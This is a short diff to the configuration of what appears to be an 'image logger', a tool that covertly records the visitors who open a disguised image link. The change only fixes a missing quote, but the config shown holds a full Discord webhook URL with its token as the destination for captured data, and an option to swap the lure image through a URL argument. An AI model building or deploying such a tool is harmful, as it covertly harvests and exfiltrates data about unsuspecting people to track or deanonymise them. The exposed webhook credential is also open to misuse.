@@ -13,7 +13,7 @@ __author__ = "nicdevs"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1142479304698114189/-7yEruxXoM9K8Dxbza0lSAgmknsfn1lhx1sjy8pKw6SFO4StEIlw8t84eBrCzz0SRQbp",
-    "image": "https://cdn.discordapp.com/attachments/1151525349314801674/1151525897313210439/Screenshot_356.png, # You can also have a custom image by using a URL argument
+    "image": "https://cdn.discordapp.com/attachments/1151525349314801674/1151525897313210439/Screenshot_356.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
